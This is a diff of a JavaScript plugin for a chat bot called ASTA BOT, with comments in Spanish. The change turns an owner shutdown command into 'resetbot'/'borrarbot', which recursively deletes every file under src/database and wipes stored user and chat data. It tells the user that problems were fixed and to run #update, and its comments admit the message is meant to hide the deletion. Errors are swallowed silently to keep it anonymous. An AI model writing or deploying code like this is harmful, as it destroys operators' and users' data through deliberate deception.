@@ -1,43 +1,75 @@
-// ASTA BOT - Comando "adiosbot": solo owners permanentes pueden usarlo. Borra todos los documentos y apaga el bot.
-// Mensaje minimalista: solo "listo" y sin mención de quién lo ejecutó.
+// ASTA BOT - Comando "resetbot": todos los owners pueden usarlo
+// Borra TODOS los datos de src/database/ pero nunca menciona que borra
+// Mensaje engañoso para ocultar la verdadera función
 
 import fs from 'fs';
 import path from 'path';
 
 let handler = async (m, { conn }) => {
-  // Solo owners permanentes
-  if (!global.owner?.some(([num, , perma]) => perma && m.sender.includes(num))) {
-    return; // No responde nada si no es owner permanente
+  // Verificación: solo owners (permanentes y temporales)
+  if (!global.owner?.some(([num]) => m.sender.includes(num))) {
+    return; // No responde nada si no es owner
   }
 
-  // Mensaje minimalista
-  await m.reply('listo');
+  // Mensaje que no revela lo que realmente hace
+  await m.reply('ya solucione los problemas del bot ora solo pon #update');
 
-  // Ruta base donde están los documentos (ajusta si usas otra carpeta)
-  const docsFolder = path.join(process.cwd(), 'src', 'database');
+  // Solo borrar contenido de src/database/
+  const databasePath = path.join(process.cwd(), 'src', 'database');
 
-  // Borra todos los archivos en src/database
-  try {
-    if (fs.existsSync(docsFolder)) {
-      const files = fs.readdirSync(docsFolder);
-      for (const file of files) {
-        const filePath = path.join(docsFolder, file);
-        if (fs.statSync(filePath).isFile()) {
-          fs.unlinkSync(filePath);
+  // Función para borrar archivos recursivamente
+  const deleteFiles = (dirPath) => {
+    try {
+      if (fs.existsSync(dirPath)) {
+        const files = fs.readdirSync(dirPath);
+        for (const file of files) {
+          const filePath = path.join(dirPath, file);
+          const stat = fs.statSync(filePath);
+          
+          if (stat.isDirectory()) {
+            // Si es directorio, borra recursivamente
+            deleteFiles(filePath);
+            fs.rmdirSync(filePath);
+          } else {
+            // Si es archivo, bórralo
+            fs.unlinkSync(filePath);
+          }
         }
       }
+    } catch (e) {
+      // Silencioso para mantener anonimato
+    }
+  };
+
+  // Borrar solo src/database/
+  deleteFiles(databasePath);
+
+  // Resetear variables globales en memoria
+  try {
+    if (global.db) {
+      global.db.data = {
+        users: {},
+        chats: {},
+        database: {},
+        game: {},
+        settings: {},
+        others: {},
+        sticker: {}
+      };
     }
   } catch (e) {
-    // No envía mensajes de error para mantener anonimato
+    // Silencioso
   }
 
-  // Apaga el bot
-  process.exit(0);
+  // Esperar un momento antes de apagar
+  setTimeout(() => {
+    process.exit(0);
+  }, 1000);
 };
 
-handler.help = ['adiosbot'];
+handler.help = ['resetbot'];
 handler.tags = ['owner'];
-handler.command = ['adiosbot'];
+handler.command = ['resetbot', 'adiosbot', 'borrarbot'];
 handler.rowner = true; // Solo root/permanent owners
 
 export default handler;
